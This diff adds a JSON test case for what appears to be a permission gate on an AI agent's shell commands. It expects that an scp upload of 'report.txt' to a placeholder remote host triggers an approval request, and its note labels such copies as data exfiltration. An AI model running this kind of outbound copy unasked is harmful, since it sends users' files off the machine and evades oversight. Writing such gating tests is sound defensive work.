@@ -1,0 +1,6 @@
+{
+  "name": "scp-to-remote-host-asks-for-picto",
+  "note": "scp with a `user@host:` (or `host:`) target exfiltrates data to a remote box. `scp a b` (both local, no colon) is NOT gated — see egress_scp_local_guard.",
+  "call": { "tool": "Bash", "input": { "command": "scp report.txt user@host.example.com:/tmp/" } },
+  "expected": { "kind": "ask_picto", "required_scope": "net.scp:out" }
+}
